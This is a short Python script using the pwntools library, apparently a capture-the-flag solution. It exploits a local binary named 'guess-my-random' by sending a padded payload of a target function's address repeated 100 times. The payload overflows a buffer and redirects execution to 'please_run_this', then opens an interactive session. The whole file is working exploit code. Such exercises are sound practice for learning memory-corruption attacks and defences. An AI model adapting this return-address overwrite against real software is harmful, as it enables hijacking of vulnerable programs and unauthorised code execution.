from pwn import *

thing = ELF('./guess-my-random').symbols['please_run_this']

p = process("./guess-my-random")
p.sendline('aaaa' + (p32(thing) * 100))
p.interactive()

